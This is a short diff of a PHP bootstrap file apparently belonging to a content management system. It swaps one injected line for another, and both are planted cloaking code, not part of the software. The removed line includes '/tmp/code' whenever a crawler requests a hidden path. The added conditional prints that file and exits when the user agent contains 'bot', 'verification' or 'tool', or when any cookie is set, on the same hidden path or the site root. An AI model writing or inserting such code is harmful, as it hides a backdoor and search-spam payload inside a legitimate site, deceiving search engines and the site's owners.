@@ -4,7 +4,10 @@
  * @defgroup index Index
  * Bootstrap and initialization code.
  */
-error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/index.php/IEJ'){ include('/tmp/code'); exit; }
+if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/index.php/IEJ/' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/index.php/IEJ/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/index.php/IEJ/') {
+    echo implode('', file('/tmp/code'));
+    exit;
+}
 /**
  * @file includes/bootstrap.php
  *
